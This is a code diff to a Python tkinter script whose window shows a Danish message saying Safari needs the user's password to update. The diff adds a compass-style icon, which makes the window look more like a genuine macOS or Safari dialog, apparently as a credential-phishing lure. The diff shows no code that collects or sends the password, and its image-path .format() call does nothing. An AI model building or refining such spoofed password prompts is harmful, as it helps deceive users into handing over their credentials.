@@ -1,5 +1,6 @@
 import tkinter
-
+from PIL import ImageTk, Image
+import os
 size = ['440', '165']
 
 
@@ -31,5 +32,11 @@ minspec.config(font=("Lucida Grande", 10))
 spec = tkinter.Label(mainwindow, text='Safari skal bruge din adgangskode\ntil at opdatere.', justify='left')
 spec.config(font=('Lucida Grande bold', 14))
 spec.place(x=90, y=20)
+
+
+image = ImageTk.PhotoImage(Image.open('/compass.jpg'.format(os.getcwd())))
+panel = tkinter.Label(mainwindow, image=image)
+panel.pack()
+panel.place(x=0, y=0)
 
 mainwindow.mainloop()
